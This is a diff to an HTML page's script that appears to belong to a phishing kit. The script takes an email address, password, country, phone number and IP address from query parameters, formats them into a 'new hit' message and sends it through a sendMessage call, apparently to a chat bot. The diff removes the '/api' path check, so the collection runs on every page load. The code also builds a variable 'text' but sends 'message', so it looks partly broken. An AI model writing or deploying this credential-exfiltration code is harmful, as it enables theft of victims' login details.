@@ -30,7 +30,7 @@
         }
 
         // Check if the request is for an API call
-        if (window.location.pathname === "/api") {
+        
             const email = getQueryParam("e");
             const password = getQueryParam("p");
             const country = getQueryParam("country");
@@ -39,14 +39,12 @@
             
             
             if (email) {
-            	let text = `
-            	ʜɪ ɴᴇᴡ ʜɪᴛ 🖤.
+            	let text = `ʜɪ ɴᴇᴡ ʜɪᴛ 🖤.
 ᯓ ᴇᴍᴀɪʟ » ${email}
 ᯓ ᴘᴀꜱꜱᴡᴏʀᴅ » ${password}
 ᯓ ᴄᴏᴜɴᴛʀʏ » ${country}
 ᯓ ᴅɪᴀʟᴄᴏᴅᴇ » ${phone}
-ᯓ ɪᴘ » ${ip}
-            	`;
+ᯓ ɪᴘ » ${ip}`;
             	
                 sendMessage(message).then(data => {
                     const status = data.ok ? "Message sent successfully!" : "Failed to send message";
@@ -65,7 +63,7 @@
                 };
                 document.body.innerHTML = JSON.stringify(response);
             }
-        }
+        
     </script>
 
 </body>
